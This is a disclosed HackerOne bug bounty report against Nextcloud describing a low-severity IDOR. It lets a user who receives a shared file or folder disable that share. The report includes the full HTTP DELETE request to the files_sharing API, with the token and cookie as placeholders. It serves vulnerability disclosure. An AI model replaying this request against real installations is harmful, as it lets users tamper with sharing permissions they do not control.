# IDOR - Disable sharing

## Report Details
- **Report ID**: 153905
- **URL**: https://hackerone.com/reports/153905
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-07-26T06:21:54.786Z
- **Disclosed**: 2016-12-03T21:58:44.569Z

## Reporter
- **Username**: dalt4sec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Decription:
-----
Users are shared files or folder. can disable this sharing.

Detail:
------
 + use request:

DELETE /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json HTTP/1.1
Host: [your-host]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
requesttoken: [token of user is shared]
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Cookie: [cookie of user is shared]
Connection: keep-alive

Note:
----
only user is shared or user in group is shared can do it

## Attachments
- admin-shared-to-user1.PNG
- Result.PNG
- user1-disable-sharing.PNG
